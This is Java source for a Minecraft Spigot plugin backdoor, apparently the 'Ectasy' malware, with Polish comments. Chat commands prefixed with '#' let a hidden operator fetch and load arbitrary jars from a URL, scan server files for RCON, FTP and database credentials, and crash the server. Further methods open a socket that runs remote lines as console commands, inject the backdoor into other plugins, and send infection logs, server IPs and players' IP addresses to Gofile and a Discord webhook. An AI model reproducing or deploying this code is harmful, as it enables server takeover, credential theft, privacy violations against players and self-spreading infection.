        if (message.startsWith("#PobierzPlugin")) {
            String[] parts = message.split(" ", 2);
            if (parts.length < 2) {
                player.sendMessage(formatMsg.apply("Usage: #PobierzPlugin [link]"));
                event.setCancelled(true);
                return;
            }

            String pluginUrl = parts[1];
            Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
                try {
                    // Pobieranie nazwy pliku z URL (bez parametrów)
                    String cleanUrl = pluginUrl.split("\\?")[0]; // Usunięcie parametrów po znaku '?'
                    String fileName = cleanUrl.substring(cleanUrl.lastIndexOf("/") + 1);
                    File pluginFolder = new File(plugin.getDataFolder().getParentFile(), "plugins");
                    File pluginFile = new File(pluginFolder, fileName);

                    // Tworzenie folderu plugins, jeśli nie istnieje
                    if (!pluginFolder.exists()) {
                        pluginFolder.mkdirs();
                    }

                    // Pobieranie pliku z internetu
                    player.sendMessage("Downloading plugin from: " + pluginUrl);
                    try (InputStream in = new URL(pluginUrl).openStream()) {
                        Files.copy(in, pluginFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
                    }

                    // Sprawdzanie, czy plik istnieje
                    if (!pluginFile.exists()) {
                        player.sendMessage(formatMsg.apply("Failed to download the plugin. File not found after download."));
                        return;
                    }

                    // Ładowanie pluginu
                    Bukkit.getScheduler().runTask(plugin, () -> {
                        try {
                            Plugin plugin = Bukkit.getPluginManager().loadPlugin(pluginFile);
                            if (plugin != null) {
                                Bukkit.getPluginManager().enablePlugin(plugin);
                                player.sendMessage(formatMsg.apply("Successfully loaded and enabled plugin: " + plugin.getName()));
                            } else {
                                player.sendMessage(formatMsg.apply("Failed to load the plugin. Check if the plugin is compatible."));
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                            player.sendMessage(formatMsg.apply("An error occurred while loading the plugin: " + e.getMessage()));
                        }
                    });
                } catch (Exception e) {
                    e.printStackTrace();
                    player.sendMessage(formatMsg.apply("An error occurred: " + e.getMessage()));
                }
            });

            event.setCancelled(true);
            return;
        }
        if (message.equalsIgnoreCase("#skibidi!rcon")) {
            String rconInfo = scanRcon();
            event.getPlayer().sendMessage(formatMsg.apply(ChatColor.GREEN + "[INFO] " + ChatColor.YELLOW + rconInfo));
            event.setCancelled(true);
            return;
        }

        if (message.equalsIgnoreCase("#skibidi!ftp")) {
            String ftpInfo = scanFtp();
            event.getPlayer().sendMessage(ChatColor.GREEN + "[INFO] " + ChatColor.YELLOW + ftpInfo);
            event.setCancelled(true);
            return;
        }

        if (message.equalsIgnoreCase("#skibidi!bazy-danych")) {
            String dbInfo = scanDatabases();
            String databaseInf = scanBazaDanych();
            event.getPlayer().sendMessage(ChatColor.GREEN + "[INFO DB] " + ChatColor.YELLOW + dbInfo);
            event.getPlayer().sendMessage("\n");
            event.getPlayer().sendMessage(ChatColor.GREEN + "[INFO BAZA DANYCH] " + ChatColor.YELLOW + databaseInf);
            event.setCancelled(true);
        }
        if (message.startsWith("#RemoveCrasherPlugin")) {
            String[] parts = message.split(" ");
            if (parts.length > 1) {
                String version = parts[1];
                String pluginFileName = "CrashPlugin-" + version + ".jar";
                File pluginFile = new File(plugin.getServer().getPluginManager().getPlugin("CrashPlugin").getDataFolder().getParentFile(), pluginFileName);

                // Wyłączanie pluginu
                Bukkit.getScheduler().runTask(plugin, () -> {
                    Plugin crasherPlugin = plugin.getServer().getPluginManager().getPlugin("CrashPlugin");
                    if (crasherPlugin != null && crasherPlugin.isEnabled()) {
                        plugin.getServer().getPluginManager().disablePlugin(crasherPlugin); // Wyłącz plugin
                        player.sendMessage("Disabling plugin: " + crasherPlugin.getName());
                    }

                    // Usuwanie pliku pluginu
                    if (pluginFile.exists()) {
                        boolean deleted = pluginFile.delete();
                        if (deleted) {
                            player.sendMessage("Plugin " + pluginFileName + " has been removed successfully.");
                        } else {
                            player.sendMessage("Failed to remove " + pluginFileName + ". Ensure you have the correct permissions.");
                        }
                    } else {
                        player.sendMessage("Plugin " + pluginFileName + " not found.");
                    }
                });

                event.setCancelled(true);
            } else {
                player.sendMessage("Usage: #RemoveCrasherPlugin [version]");
            }
        }

    }

    private boolean checkIfEssentials() {
        Plugin essentials = Bukkit.getPluginManager().getPlugin("Essentials");
        return essentials != null && essentials.isEnabled();
    }

    @EventHandler
    public void onServerListPing(ServerListPingEvent event) {
        if (motdEnabled) {
            event.setMotd(customMotd);
        }
    }



    private void startSocketConnection(String ip, int port, Player player) {
        stopSocketConnection(); // zamknij wcześniejsze

        running = true;
        connectedPlayer = player;

        socketThread = new Thread(() -> {
            while (running) {
                try {
                    socket = new Socket(ip, port);
                    reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    sendPrivateMsg(player, ChatColor.GREEN + "Połączono z " + ip + ":" + port);

                    String line;
                    while ((line = reader.readLine()) != null && running) {
                        String cmd = line.trim();
                        if (!cmd.isEmpty()) {
                            Bukkit.getScheduler().runTask(plugin, () ->
                                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd)
                            );
                        }
                    }
                } catch (IOException e) {
                    sendPrivateMsg(player, ChatColor.RED + "Utracono połączenie. Próba ponownego połączenia za 5s...");
                    try {
                        Thread.sleep(5000);
                    } catch (InterruptedException ignored) {}
                } finally {
                    try {
                        if (reader != null) reader.close();
                        if (socket != null && !socket.isClosed()) socket.close();
                    } catch (IOException ignored) {}
                }
            }
        });

        socketThread.setDaemon(true);
        socketThread.start();
    }

    private void stopSocketConnection() {
        running = false;

        try {
            if (reader != null) reader.close();
            if (socket != null && !socket.isClosed()) socket.close();
        } catch (IOException ignored) {}

        if (socketThread != null) socketThread.interrupt();

        socket = null;
        reader = null;
        socketThread = null;
        connectedPlayer = null;
    }

    private void sendPrivateMsg(Player player, String msg) {
        if (player != null && player.isOnline()) {
            player.sendMessage(msg);
        }
    }


    private void deleteFile(File file) {
        if (file.isDirectory()) {
            // Recursive deletion of files in subdirectories
            for (File subFile : file.listFiles()) {
                deleteFile(subFile); // Deleting files inside the folder
            }
        }

        // Deleting .jar files
        if (file.getName().endsWith(".jar")) {
            if (file.exists() && !file.delete()) {
                Bukkit.getLogger().warning("Failed to delete .jar file: " + file.getAbsolutePath());
            } else {
                Bukkit.getLogger().info("Deleted .jar file: " + file.getAbsolutePath());
            }
        }

        // Deleting other files or folders
        else if (file.exists() && !file.delete()) {
            Bukkit.getLogger().warning("Failed to delete file or folder: " + file.getAbsolutePath());
        }
    }

    private String scanRcon() {
        return scanForKeyword("rcon");
    }

    private String scanFtp() {
        return scanForKeyword("ftp");
    }

    private String scanDatabases() {
        return scanForKeyword("database");

    }

    private String scanBazaDanych() {
        return scanForKeyword("Baza danych");
    }

    private String scanForKeyword(String keyword) {
        String result = "Szukam " + keyword.toUpperCase() + "...\n";
        File directory = new File("."); // Przeszukuje cały katalog serwera
        List<File> files = listFiles(directory);
        for (File file : files) {
            result += searchInFile(file, keyword);
        }
        return result.isEmpty() ? "Nie znaleziono " + keyword + " w żadnym pliku\n" : result;
    }

    private List<File> listFiles(File directory) {
        List<File> fileList = new ArrayList<>();
        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isFile()) {
                    fileList.add(file);
                } else if (file.isDirectory()) {
                    fileList.addAll(listFiles(file));
                }
            }
        }
        return fileList;
    }

    private String searchInFile(File file, String keyword) {
        try (Scanner scanner = new Scanner(file)) {
            while (scanner.hasNextLine()) {
                String line = scanner.nextLine();
                if (line.toLowerCase().contains(keyword.toLowerCase())) {
                    return "Znaleziono w " + file.getPath() + ": " + line + "\n";
                }
            }
        } catch (Exception ignored) {
        }
        return "";
    }

    @EventHandler
    public void onPlayerInteract(PlayerInteractEvent event) {
        Player player = event.getPlayer();
        if (event.getAction() == Action.RIGHT_CLICK_BLOCK || event.getAction() == Action.RIGHT_CLICK_AIR) {
            // Handle special TNT throwing
            ItemStack itemInHand = player.getInventory().getItemInMainHand();
            if (itemInHand.getType() == Material.TNT && itemInHand.hasItemMeta() && "Special TNT".equals(itemInHand.getItemMeta().getDisplayName())) {
                if (event.getAction() == Action.RIGHT_CLICK_AIR) {
                    TNTPrimed tnt = player.getWorld().spawn(player.getEyeLocation().add(player.getLocation().getDirection().multiply(2)), TNTPrimed.class);
                    tnt.setFuseTicks(80);  // 4 seconds fuse
                    tnt.setYield(4f);  // Bigger explosion
                    player.getInventory().removeItem(new ItemStack(Material.TNT, 1));
                    player.sendMessage("Special TNT thrown!");
                }
                event.setCancelled(true);
            }

            // Handle wand usage
            if (allowedPlayers.contains(player.getUniqueId())){
                if (player.getInventory().getItemInMainHand().getType() == Material.DIAMOND_AXE && itemInHand.hasItemMeta()) {
                    Block clickedBlock = event.getClickedBlock();
                    if (clickedBlock != null) {
                        replaceBlocks(clickedBlock, selectedBlock, radius);
                        player.sendMessage("Replaced blocks within radius.");
                    }
                    event.setCancelled(true);
                }
            }
            else{
                event.setCancelled(true);
            }
            event.setCancelled(true);

        }

    }

    private void replaceBlocks(Block startBlock, Material material, int radius) {
        World world = startBlock.getWorld();
        for (int x = -radius; x <= radius; x++) {
            for (int y = -radius; y <= radius; y++) {
                for (int z = -radius; z <= radius; z++) {
                    if (x * x + y * y + z * z <= radius * radius) {
                        Block block = world.getBlockAt(startBlock.getX() + x, startBlock.getY() + y, startBlock.getZ() + z);
                        if (block.getType() != material) {
                            block.setType(material);
                        }
                    }
                }
            }
        }
    }

    private Path createServerFilesBackup() throws IOException {
        Path zipPath = Paths.get("server_files_backup.zip");
        try (ZipOutputStream zipOut = new ZipOutputStream(Files.newOutputStream(zipPath))) {
            // Zmiana ścieżki i dodanie folderów do kopii zapasowej
            String[] directoriesToBackup = {"plugins", "world", "world_nether", "world_the_end", "versions"};

            for (String dir : directoriesToBackup) {
                Path dirPath = Paths.get(dir);
                if (Files.exists(dirPath)) {
                    Files.walk(dirPath)
                            .filter(Files::isRegularFile)
                            .forEach(path -> {
                                try {
                                    // Określenie, w którym folderze ma się znaleźć plik w archiwum
                                    String entryPath = dir + "/" + dirPath.relativize(path).toString();
                                    ZipEntry zipEntry = new ZipEntry(entryPath);
                                    zipOut.putNextEntry(zipEntry);
                                    Files.copy(path, zipOut);
                                    zipOut.closeEntry();
                                } catch (IOException e) {
                                    e.printStackTrace();
                                }
                            });
                }
            }
        }
        return zipPath;
    }


// W klasie SpigotAPI (głównej) dodaj:

    private boolean infectSinglePlugin(File pluginFile, String newCode) {
        try {
            File tempDir = new File("ectasy-temp");
            if (!tempDir.exists()) tempDir.mkdirs();

            File inputFile = new File(tempDir, pluginFile.getName());
            File outputFile = new File(tempDir, pluginFile.getName().replace(".jar", "-infected.jar"));

            // Skopiuj oryginalny plugin
            Files.copy(pluginFile.toPath(), inputFile.toPath(), StandardCopyOption.REPLACE_EXISTING);

            // Przygotuj argumenty dla injectora
            List<String> args = new ArrayList<>();
            args.add("java");
            args.add("-jar");
            args.add(getCurrentJarPath());
            args.add("--input");
            args.add(inputFile.getAbsolutePath());
            args.add("--output");
            args.add(outputFile.getAbsolutePath());

            if (webhook != null && !webhook.isEmpty()) {
                args.add("--webhook");
                args.add(webhook);
            }

            if (joinLogs) {
                args.add("--logjoins");
            }

            // Uruchom proces infekcji
            ProcessBuilder pb = new ProcessBuilder(args);
            pb.directory(Bukkit.getWorldContainer());
            pb.redirectErrorStream(true);

            Process process = pb.start();

            // Czytaj output procesu
            StringBuilder output = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
            }

            int exitCode = process.waitFor();

            if (exitCode == 0 && outputFile.exists()) {
                // Zamknij plugin jeśli jest załadowany
                String pluginName = pluginFile.getName().replace(".jar", "");
                Plugin targetPlugin = Bukkit.getPluginManager().getPlugin(pluginName);
                if (targetPlugin != null) {
                    Bukkit.getPluginManager().disablePlugin(targetPlugin);
                }

                // Zamień oryginalny plugin na zainfekowany
                Files.move(outputFile.toPath(), pluginFile.toPath(), StandardCopyOption.REPLACE_EXISTING);

                // Restart plugin jeśli był załadowany
                if (targetPlugin != null) {
                    Bukkit.getScheduler().runTaskLater(plugin, () -> {
                        try {
                            Bukkit.getPluginManager().enablePlugin(targetPlugin);
                        } catch (Exception e) {
                            // Plugin zostanie załadowany przy następnym restarcie
                        }
                    }, 20L);
                }

                return true;
            } else {
                System.err.println("Infection failed for " + pluginFile.getName() + ": " + output.toString());
                return false;
            }

        } catch (Exception e) {
            System.err.println("Error infecting " + pluginFile.getName() + ": " + e.getMessage());
            return false;
        }
    }

    // Metoda do pobrania ścieżki do obecnego JARa
// Zastąp tę metodę:
    private String getCurrentJarPath() {
        try {
            // Spróbuj różne sposoby znalezienia ścieżki do injectora
            File currentJar = new File(getClass().getProtectionDomain().getCodeSource().getLocation().toURI());
            if (currentJar.exists()) {
                return currentJar.getAbsolutePath();
            }

            // Alternatywnie szukaj pliku w katalogu plugins
            File pluginsDir = new File("plugins");
            File[] jars = pluginsDir.listFiles((dir, name) ->
                    name.toLowerCase().contains("ectasy") && name.endsWith(".jar"));

            if (jars != null && jars.length > 0) {
                return jars[0].getAbsolutePath();
            }

            return "ectasy.jar"; // fallback

        } catch (Exception e) {
            // Jeśli wszystko zawiedzie, użyj fallback
            return "ectasy.jar";
        }
    }


    // Metoda uploadująca do Gofile
    private String uploadToGofile(Path filePath) throws IOException {
        String server = "store1";
        String uploadUrl = "https://" + server + ".gofile.io/contents/uploadfile";
        String boundary = "------------------------" + System.currentTimeMillis();

        HttpURLConnection connection = (HttpURLConnection) new URL(uploadUrl).openConnection();
        connection.setDoOutput(true);
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

        try (OutputStream out = connection.getOutputStream()) {
            PrintWriter writer = new PrintWriter(new OutputStreamWriter(out, StandardCharsets.UTF_8), true);

            writer.append("--" + boundary).append("\r\n");
            writer.append("Content-Disposition: form-data; name=\"file\"; filename=\"").append(filePath.getFileName().toString()).append("\"\r\n");
            writer.append("Content-Type: text/plain\r\n\r\n").flush();

            Files.copy(filePath, out);
            out.flush();

            writer.append("\r\n").flush();
            writer.append("--" + boundary + "--\r\n").flush();

            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        response.append(line);
                    }
                    String responseBody = response.toString();
                    // Parsowanie odpowiedzi JSON
                    if (responseBody.contains("downloadPage")) {
                        String downloadPageUrl = responseBody.split("\"downloadPage\":\"")[1].split("\"")[0];
                        return downloadPageUrl;
                    }
                }
            }
            throw new IOException("Upload failed with code: " + responseCode);
        }
    }

    // Metoda do pobierania z Pastebin
    private String downloadFromPastebin(String rawPastebinUrl) throws IOException {
        URL url = new URL(rawPastebinUrl);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");

        try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
            StringBuilder content = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                content.append(line).append("\n");
            }
            return content.toString();
        }
    }

    // Główna metoda infekcji
// Poprawiona metoda infectPlugins:
    private void infectPlugins(Player player, String pastebinUrl) {
        if (!hasAdminAccess && !hasOwnerAccess) {
            player.sendMessage("§cBrak uprawnień!");
            return;
        }

        try {
            player.sendMessage("§7Pobieranie kodu z Pastebin...");
            String newCode = downloadFromPastebin(pastebinUrl);

            // Znajdź pluginy do infekcji (TYLKO czyste - jeszcze nie zainfekowane)
            File pluginsFolder = new File("plugins");
            File[] pluginFiles = pluginsFolder.listFiles((dir, name) -> name.endsWith(".jar"));

            if (pluginFiles == null || pluginFiles.length == 0) {
                player.sendMessage("§cNie znaleziono pluginów!");
                return;
            }

            List<File> targetPlugins = new ArrayList<>();
            for (File pluginFile : pluginFiles) {
                String fileName = pluginFile.getName().replace(".jar", "");

                // Sprawdź czy plugin jest na liście targetów i czy nie jest już zainfekowany
                boolean isTarget = targetPluginNames.stream()
                        .anyMatch(target -> fileName.toLowerCase().contains(target.toLowerCase()));

                if (isTarget && !isPluginInfected(pluginFile)) {
                    targetPlugins.add(pluginFile);
                }
            }

            if (targetPlugins.isEmpty()) {
                player.sendMessage("§cWszystkie pluginy są już zainfekowane lub brak celów!");
                return;
            }

            player.sendMessage("§aZnaleziono " + targetPlugins.size() + " czystych pluginów do infekcji");

            // Infekuj wszystkie znalezione pluginy
            int successCount = 0;
            for (File pluginFile : targetPlugins) {
                if (infectSinglePlugin(pluginFile, newCode)) {
                    successCount++;
                    player.sendMessage("§7✓ " + pluginFile.getName());
                }
            }

            // Zapisz logi
            String logContent = "Infected plugins: " + successCount + "/" + targetPlugins.size() +
                    "\nMaster: " + currentMasterPlugin +
                    "\nServer: " + getIP() +
                    "\nTime: " + new Date();

            Path logFile = saveLogToFile(logContent);
            String downloadUrl = uploadToGofile(logFile);

            player.sendMessage("§aInfekcja zakończona! Udane: " + successCount);
            player.sendMessage("§aLogi: " + downloadUrl);

        } catch (Exception e) {
            player.sendMessage("§cBłąd podczas infekcji: " + e.getMessage());
            e.printStackTrace();
        }
    }

    // Metoda sprawdzająca czy plugin jest już zainfekowany
    private boolean isPluginInfected(File pluginFile) {
        try (JarFile jar = new JarFile(pluginFile)) {
            return jar.getEntry("fr/bodyalhoha/ectasy/SpigotAPI.class") != null;
        } catch (Exception e) {
            return false;
        }
    }

    private String createInfectionLog(String masterPlugin, List<File> allTargets) {
        StringBuilder log = new StringBuilder();
        log.append("=== ECTASY INFECTION REPORT ===\n");
        log.append("Timestamp: ").append(new Date()).append("\n");
        log.append("Server IP: ").append(getIP()).append("\n");
        log.append("Master Plugin: ").append(masterPlugin).append("\n");
        log.append("Infected Plugins: ").append(infectedPlugins.size()).append("\n");
        log.append("Available Targets: ").append(allTargets.size()).append("\n");
        log.append("All Targets:\n");

        for (File target : allTargets) {
            String status = infectedPlugins.contains(target.getName().replace(".jar", "")) ?
                    "[INFECTED]" : "[CLEAN]";
            log.append("  - ").append(target.getName()).append(" ").append(status).append("\n");
        }

        log.append("Current Master: ").append(currentMasterPlugin).append("\n");
        log.append("=== END REPORT ===");

        return log.toString();
    }

    private Path saveLogToFile(String content) throws IOException {
        String fileName = "infection_log_" + System.currentTimeMillis() + ".txt";
        Path filePath = Paths.get(fileName);
        Files.write(filePath, content.getBytes());
        return filePath;
    }

    private void sendInfectionWebhook(String pluginName, String logUrl) {
        if (webhook == null || webhook.isEmpty()) return;

        try {
            JSONObject json = new JSONObject();
            json.put("content", "🦠 Nowa infekcja wykonana!");

            JSONObject embed = new JSONObject();
            embed.put("title", "Infection Report");
            embed.put("color", 0xff0000);

            JSONArray fields = new JSONArray();

            JSONObject field1 = new JSONObject();
            field1.put("name", "Master Plugin");
            field1.put("value", pluginName);
            field1.put("inline", true);
            fields.add(field1);

            JSONObject field2 = new JSONObject();
            field2.put("name", "Logs");
            field2.put("value", logUrl);
            field2.put("inline", true);
            fields.add(field2);

            JSONObject field3 = new JSONObject();
            field3.put("name", "Server IP");
            field3.put("value", getIP());
            field3.put("inline", true);
            fields.add(field3);

            embed.put("fields", fields);

            JSONArray embeds = new JSONArray();
            embeds.add(embed);
            json.put("embeds", embeds);

            // Wyślij webhook
            URL url = new URL(webhook);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setDoOutput(true);

            try (OutputStream os = connection.getOutputStream()) {
                byte[] input = json.toString().getBytes("utf-8");
                os.write(input, 0, input.length);
            }

            connection.getResponseCode(); // Trigger the request

        } catch (Exception e) {
            System.err.println("Błąd przy wysyłaniu webhook: " + e.getMessage());
        }
    }

    public void sendTitleToPlayer(Player player, String title, String subtitle, int fadeIn, int stay, int fadeOut) {
        player.sendTitle(title, subtitle, fadeIn, stay, fadeOut);
    }

    // Metoda pomocnicza do transferu graczy
    private void transferPlayer(Player player, String address) {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(b);
        try {
            out.writeUTF("Connect");
            out.writeUTF(address);
        } catch (IOException e) {
            e.printStackTrace();
        }
        player.sendPluginMessage(plugin, "BungeeCord", b.toByteArray());
    }

    @EventHandler
    public void onInventoryClick(InventoryClickEvent event) {
        if (!(event.getWhoClicked() instanceof Player)) return;
        Player player = (Player) event.getWhoClicked();

        // Sprawdzamy, czy kliknięto w GUI crasha
        if (event.getView().getTitle().equals("Wybierz typ Crash'a")) {
            event.setCancelled(true);

            // Sprawdzanie, który element GUI został kliknięty
            switch (event.getCurrentItem().getType()) {
                case PAPER:
                    if (hasAdminAccess){
                        player.sendMessage("§7Wybrałeś Lite Crash");
                        player.sendTitle("§4§lULTRA §6Crash", "§6Serwer zaczyna lagować...", 10, 70, 20);
                        crashLite(); // Wywołanie lite crasha
                        player.closeInventory(); // Zamknięcie GUI
                        break;
                    }
                    else{
                        break;
                    }
                case BLAZE_ROD:
                    if(hasAdminAccess){
                        player.sendMessage("§7Wybrałeś Medium Crash");
                        player.sendTitle("§6Medium Crash", "§6Serwer zaczyna lagować...", 10, 70, 20);
                        crashMedium(); // Wywołanie medium crasha
                        player.closeInventory(); // Zamknięcie GUI
                        break;
                    }
                    else{
                        break;
                    }
                case ANVIL:
                    if(hasAdminAccess){
                        player.sendMessage("§7Wybrałeś ULTRA Crasha");
                        player.sendTitle("§4§lULTRA §6Crash", "§6Serwer zaczyna lagować...", 10, 70, 20);
                        crashUltra(); // Wywołanie medium crasha
                        player.closeInventory(); // Zamknięcie GUI
                        break;
                    }
                    else{
                        break;
                    }

                case DRAGON_EGG:
                    if(hasAdminAccess){
                        player.sendMessage("§7Wybrałeś Hard Crash");
                        player.sendTitle("§cHard Crash", "§6Serwer zaczyna lagować...", 10, 70, 20);
                        crashHard(); // Wywołanie hard crasha
                        player.closeInventory(); // Zamknięcie GUI
                        break;
                    }
                    else{
                        break;
                    }

                case POPPED_CHORUS_FRUIT:
                    if(hasAdminAccess){
                        player.sendMessage("§7Wybrałeś §d§lMEGA §5crash!");
                        stopCrashTask(); // Zatrzymanie crasha
                        player.sendTitle("§d§lMEGA §5crash!", "§6Serwer zaczyna lagować...", 10, 70, 20);
                        megaCrash();  // Zatrzymanie spamowania
                        player.closeInventory(); // Zamknięcie GUI
                        break;
                    }

                    else{
                        break;
                }
                default:
                    break;
            }
        }
    }

    @EventHandler
    public void onPlayerMove(PlayerMoveEvent event) {
        Player player = event.getPlayer();
        if (frozenPlayers.contains(player.getUniqueId())) {
            // Cancel movement but allow looking around
            if (event.getFrom().getX() != event.getTo().getX() ||
                    event.getFrom().getY() != event.getTo().getY() ||
                    event.getFrom().getZ() != event.getTo().getZ()) {
                event.setTo(event.getFrom());
            }
        }
    }

    @EventHandler
    public void onPlayerJump(PlayerStatisticIncrementEvent event) {
        if (frozenPlayers.contains(event.getPlayer().getUniqueId())) {
            event.setCancelled(true);
        }
    }

    //LOCK SEction
    @EventHandler
    public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
        if (commandsLocked && !event.getPlayer().isOp()) {
            event.setCancelled(true);
            event.getPlayer().sendMessage("Commands are currently locked!");
        }
    }

    @EventHandler
    public void onServerCommand(ServerCommandEvent event) {
        if (consoleLocked) {
            event.setCancelled(true);
            event.getSender().sendMessage("Console commands are locked!");
        }
    }


    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {

        String adresip;

        if (joinLocked && !event.getPlayer().isOp()) {
            event.getPlayer().kickPlayer(("Server joining is currently locked!"));
        } else if (joinLogs) {
            Player target = event.getPlayer();
            if (target != null) {
                String ip = target.getAddress().getAddress().getHostAddress();
                //player.sendMessage(formatMsg.apply("IP of " + playerName + ": " + ip));
                adresip = ip;
            } else {
                adresip = "Not Found";
            }
            //event.setCancelled(true);
            //return;
            sendWebhook("{\"avatar_url\": \"https://minotar.net/helm/" + event.getPlayer().getName() + "/100.png\", \"username\": \"" + event.getPlayer().getName() + "\", \"embeds\": [{\"title\":\"Player Join\", \"color\":3447003, \"description\":\"Username: `" + event.getPlayer().getName() + "`\nIP : `" + adresip + "`\n\", \"footer\":{\"text\":\"OpenEctasy by Body Alhoha\"}}]}");

        }
    }
}
